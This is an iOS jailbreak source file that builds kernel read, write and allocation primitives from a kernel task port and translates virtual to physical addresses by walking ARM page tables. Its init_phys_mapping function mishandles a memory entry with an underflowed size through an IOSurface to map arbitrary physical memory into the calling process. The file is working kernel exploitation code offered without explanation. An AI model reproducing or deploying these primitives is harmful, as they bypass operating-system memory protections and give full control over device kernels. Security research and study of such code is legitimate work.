#include "jailbreak.h"
#include "utils.h"
#include "memory.h"

static uint64_t phys_mapping_base = 0;
static mach_port_t phys_mapping_entry = MACH_PORT_NULL;

static tt_level_t arm_16k_tt_level[4] = {
    (tt_level_t){
        .off_mask = ARM_16K_TT_L0_OFFMASK,
        .shift = ARM_16K_TT_L0_SHIFT,
        .index_mask = ARM_16K_TT_L0_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_16K_TT_L1_OFFMASK,
        .shift = ARM_16K_TT_L1_SHIFT,
        .index_mask = ARM_16K_TT_L1_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_16K_TT_L2_OFFMASK,
        .shift = ARM_16K_TT_L2_SHIFT,
        .index_mask = ARM_16K_TT_L2_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_16K_TT_L3_OFFMASK,
        .shift = ARM_16K_TT_L3_SHIFT,
        .index_mask = ARM_16K_TT_L3_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_L3BLOCK
    }
};

static tt_level_t arm_4k_tt_level[4] = {
    (tt_level_t){
        .off_mask = ARM_4K_TT_L0_OFFMASK,
        .shift = ARM_4K_TT_L0_SHIFT,
        .index_mask = ARM_4K_TT_L0_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_4K_TT_L1_OFFMASK,
        .shift = ARM_4K_TT_L1_SHIFT,
        .index_mask = ARM_4K_TT_L1_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_4K_TT_L2_OFFMASK,
        .shift = ARM_4K_TT_L2_SHIFT,
        .index_mask = ARM_4K_TT_L2_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_BLOCK
    },
    (tt_level_t){
        .off_mask = ARM_4K_TT_L3_OFFMASK,
        .shift = ARM_4K_TT_L3_SHIFT,
        .index_mask = ARM_4K_TT_L3_INDEX_MASK,
        .valid_mask = ARM_TTE_VALID,
        .type_mask = ARM_TTE_TYPE_MASK,
        .type_block = ARM_TTE_TYPE_L3BLOCK
    }
};

static tt_level_t *arm_tt_level = NULL;

void kread_buf(uint64_t addr, void *data, uint32_t size) {
    if (addr == 0 || data == NULL || size == 0) return;
    uint32_t offset = 0;
    
    while (offset < size) {
        mach_vm_size_t read_size = 0;
        mach_vm_size_t current_size = 2048;
        if (current_size > (size - offset)) current_size = size - offset;
        
        int kr = mach_vm_read_overwrite(kinfo->tfp0, addr + offset, current_size, (uint64_t)data + offset, &read_size);
        if (kr != 0 || read_size != current_size) break;
        offset += read_size;
    }
}

void kwrite_buf(uint64_t addr, void *data, uint32_t size) {
    if (addr == 0 || data == NULL || size == 0) return;
    uint32_t offset = 0;
    
    while (offset < size) {
        mach_msg_type_number_t current_size = 2048;
        if (current_size > (size - offset)) current_size = size - offset;
        
        if (mach_vm_write(kinfo->tfp0, addr + offset, (uint64_t)data + offset, current_size) != 0) break;
        offset += current_size;
    }
}

uint8_t kread8(uint64_t addr) {
    uint8_t value = 0;
    kread_buf(addr, &value, 1);
    return value;
}

uint16_t kread16(uint64_t addr) {
    uint16_t value = 0;
    kread_buf(addr, &value, 2);
    return value;
}

uint32_t kread32(uint64_t addr) {
    uint32_t value = 0;
    kread_buf(addr, &value, 4);
    return value;
}

uint64_t kread64(uint64_t addr) {
    uint64_t value = 0;
    kread_buf(addr, &value, 8);
    return value;
}

void kwrite8(uint64_t addr, uint8_t value) {
    kwrite_buf(addr, &value, 1);
}

void kwrite16(uint64_t addr, uint16_t value) {
    kwrite_buf(addr, &value, 2);
}

void kwrite32(uint64_t addr, uint32_t value) {
    kwrite_buf(addr, &value, 4);
}

void kwrite64(uint64_t addr, uint64_t value) {
    kwrite_buf(addr, &value, 8);
}

uint64_t kalloc(uint32_t size) {
    if (size == 0) return 0;
    uint64_t addr = 0;
    mach_vm_allocate(kinfo->tfp0, &addr, size, VM_FLAGS_ANYWHERE);
    return addr;
}

uint64_t kalloc_wired(uint32_t size) {
    if (size == 0 || !MACH_PORT_VALID(kinfo->host_priv)) return 0;
    size = (uint32_t)round_page_kernel(size);
    
    uint64_t addr = 0;
    mach_vm_allocate(kinfo->tfp0, &addr, size, VM_FLAGS_ANYWHERE);
    if (addr == 0) return 0;
    
    if (mach_vm_wire(kinfo->host_priv, kinfo->tfp0, addr, size, VM_PROT_READ|VM_PROT_WRITE) != 0) {
        printf("[-] wire failed for 0x%llx with size: 0x%x\n", addr, size);
        kzero(addr, size);
    }
    return addr;
}

void kfree(uint64_t addr, uint32_t size) {
    if (addr == 0 || size == 0) return;
    mach_vm_deallocate(kinfo->tfp0, addr, size);
}

void kzero(uint64_t addr, uint32_t size) {
    if (addr == 0 || size == 0) return;
    void *data = calloc(1, size);
    if (data == NULL) return;
    
    bzero(data, size);
    kwrite_buf(addr, data, size);
    free(data);
}

uint64_t phystokv(uint64_t pa) {
    if (kinfo->patches.ptov_table == 0 || pa == 0) return 0;
    struct ptov_table_entry {
        uint64_t pa;
        uint64_t va;
        uint64_t len;
    } ptov_table[8] = {0};
    
    kread_buf(kinfo->patches.ptov_table, &ptov_table[0], sizeof(ptov_table));
    for (uint64_t i = 0; (i < 8) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }
    return pa - kinfo->patches.gPhysBase + kinfo->patches.gVirtBase;
}

static uint64_t ttep_vtophys(uint64_t ttep, uint64_t va) {
    if (arm_tt_level == NULL) {
        if (kinfo->page_size == 0x1000) {
            arm_tt_level = &arm_4k_tt_level[0];
        } else {
            arm_tt_level = &arm_16k_tt_level[0];
        }
    }
    
    for (uint64_t level = PMAP_TT_L1_LEVEL; level <= PMAP_TT_L3_LEVEL; level++) {
        if (level > PMAP_TT_L3_LEVEL || ttep == 0) return 0;
        tt_level_t *level_info = &arm_tt_level[level];

        uint64_t tte_index = (va & level_info->index_mask) >> level_info->shift;
        uint64_t tte_pa = ttep + (tte_index * 0x8);
        uint64_t tte_va = phystokv(tte_pa);
        if (tte_va == 0) return 0;

        uint64_t tte_entry = kread64(tte_va);
        if ((tte_entry & level_info->valid_mask) != level_info->valid_mask) return 0;
        if ((tte_entry & level_info->type_mask) == level_info->type_block) {
            return ((tte_entry & ARM_TTE_PA_MASK & ~level_info->off_mask) | (va & level_info->off_mask));
        }
        ttep = tte_entry & ARM_TTE_TABLE_MASK;
    }
    return ttep;
}

uint64_t get_kva_pte(uint64_t va) {
    uint64_t ttep = kinfo->cpu_ttep;
    uint64_t tte_pa = 0;

    for (uint64_t level = PMAP_TT_L1_LEVEL; level <= PMAP_TT_L3_LEVEL; level++) {
        if (level > PMAP_TT_L3_LEVEL || ttep == 0) return 0;
        tt_level_t *level_info = &arm_tt_level[level];

        uint64_t tte_index = (va & level_info->index_mask) >> level_info->shift;
        tte_pa = ttep + (tte_index * 0x8);
        uint64_t tte_va = phystokv(tte_pa);
        if (tte_va == 0) return 0;

        uint64_t tte_entry = kread64(tte_va);
        if ((tte_entry & level_info->valid_mask) != level_info->valid_mask) return 0;
        if ((tte_entry & level_info->type_mask) == level_info->type_block) {
            return tte_pa;
        }
        ttep = tte_entry & ARM_TTE_TABLE_MASK;
    }
    return tte_pa;
}

uint64_t kvtophys(uint64_t va) {
    return ttep_vtophys(kinfo->cpu_ttep, va);
}

uint64_t vtophys(uint64_t va) {
    return ttep_vtophys(kinfo->self_ttep, va);
}

static CFNumberRef CFNUM(uint32_t value) {
    return CFNumberCreate(NULL, kCFNumberIntType, (void *)&value);
}

static int init_phys_mapping(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    uint64_t oob_size = 0x4000 - 0x8000;
    memory_object_size_t mem_size = 0x30000;
    uint32_t width_height = 200;
    
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(width_height));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(width_height));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(width_height*4));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM((uint32_t)mem_size));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    void *surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == NULL) return -1;
    
    memory_object_offset_t base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    memset((void *)base, 0x41, mem_size);
    
    mach_port_t main_entry = MACH_PORT_NULL;
    vm_prot_t prot = VM_PROT_DEFAULT;
    SET_MAP_MEM(MAP_MEM_IO, prot);
    
    mach_make_memory_entry_64(mach_task_self(), &mem_size, base, prot, &main_entry, 0);
    mach_make_memory_entry_64(mach_task_self(), &oob_size, 0x8000, prot, &phys_mapping_entry, main_entry);
    CFRelease(surface);
    
    if (!MACH_PORT_VALID(phys_mapping_entry)) return -1;
    prot = VM_PROT_READ | VM_PROT_WRITE;
    uint64_t mapped = 0;
    
    if (mach_vm_map(mach_task_self(), &mapped, kinfo->page_size, 0, 1, phys_mapping_entry, 0, 0, prot, prot, 0) != 0) {
        mach_port_deallocate(mach_task_self(), phys_mapping_entry);
        phys_mapping_entry = MACH_PORT_NULL;
        return -1;
    }
    
    if (*(volatile uint64_t *)mapped == 0x1337123413371234) return -1; // fault page
    phys_mapping_base = vtophys(mapped);
    mach_vm_deallocate(mach_task_self(), mapped, kinfo->page_size);
    
    if (phys_mapping_base == 0) {
        mach_port_deallocate(mach_task_self(), phys_mapping_entry);
        phys_mapping_entry = MACH_PORT_NULL;
        return -1;
    }
    return 0;
}

uint64_t phys_map_page(uint64_t pa) {
    if (!MACH_PORT_VALID(phys_mapping_entry)) {
        if (init_phys_mapping() != 0) return 0;
    }
    
    uint64_t page = trunc_page_kernel(pa);
    uint64_t map_offset = page - phys_mapping_base;
    uint64_t page_offset = pa - page;
    vm_prot_t prot = VM_PROT_READ | VM_PROT_WRITE;
    uint64_t addr = 0;
    
    mach_vm_map(mach_task_self(), &addr, kinfo->page_size, 0, 1, phys_mapping_entry, map_offset, 0, prot, prot, 0);
    return addr + page_offset;
}

void phys_unmap_page(uint64_t va) {
    if (va == 0) return;
    mach_vm_deallocate(mach_task_self(), trunc_page_kernel(va), kinfo->page_size);
}
